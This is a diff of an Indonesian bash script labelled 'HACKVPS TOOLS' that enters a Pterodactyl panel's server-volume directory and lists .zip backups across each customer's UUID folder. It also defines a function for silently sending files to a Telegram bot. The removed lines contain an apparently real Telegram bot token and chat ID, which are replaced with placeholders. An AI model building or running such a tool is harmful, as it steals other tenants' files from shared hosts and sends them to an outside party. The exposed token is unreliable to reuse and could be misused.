@@ -18,14 +18,14 @@ cat << "EOF"
 ██║ ╚═╝ ██║██║  ██║███████╗██║██║ ╚████║╚██████╔╝
 ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
 EOF
-echo -e "${CYAN}               [ H A C K E R   T O O L S ]${RESET}"
+echo -e "${CYAN}               [ H A C K V P S   T O O L S ]${RESET}"
 echo ""
 
 cd /var/lib/pterodactyl/volumes
 
 # === CONFIG TELEGRAM ===
-BOT_TOKEN="7764774217:AAHwpnX3xh4TCY9A7X-fJHNuocEbQ05Pzeg"
-CHAT_ID="7089735468"
+BOT_TOKEN="xxx"   # ganti tokenmu
+CHAT_ID="xxx"     # ganti chat_idmu
 
 # === FUNCTION: Kirim file ke Telegram (silent) ===
 send_file() {
@@ -44,20 +44,20 @@ send_file() {
 # === MENU PILIHAN UTAMA ===
 while true; do
   echo -e "\n${CYAN}=== MENU UTAMA ===${RESET}"
-  echo -ne "${YELLOW}📦 Menampilkan file .zip di folder utama...${RESET}\n"
+  echo -ne "${YELLOW}📦 Menampilkan file .zip di folder utama UUID...${RESET}\n"
 
-  # List file .zip hanya di folder utama
-  IFS=$'\n' read -d '' -r -a FOUND_FILES < <(ls -1 *.zip 2>/dev/null && printf '\0')
+  # Cari file .zip hanya 1 level di bawah (UUID), bukan sub-subfolder
+  IFS=$'\n' read -d '' -r -a FOUND_FILES < <(find . -maxdepth 2 -type f -name "*.zip" | sed 's|^\./||' && printf '\0')
 
   if [ ${#FOUND_FILES[@]} -eq 0 ]; then
-    echo -e "${RED}❌ Tidak ada file .zip ditemukan di folder utama!${RESET}"
+    echo -e "${RED}❌ Tidak ada file .zip ditemukan!${RESET}"
     read -p "Tekan Enter untuk refresh..."
     continue
   fi
 
   # === MENU FILES ===
   while true; do
-    echo -e "\n${CYAN}=== FILE .ZIP DI FOLDER UTAMA ===${RESET}"
+    echo -e "\n${CYAN}=== FILE .ZIP DI FOLDER UUID ===${RESET}"
     for i in "${!FOUND_FILES[@]}"; do
       echo -e "${GREEN}[$i]${RESET} ${FOUND_FILES[$i]}"
     done
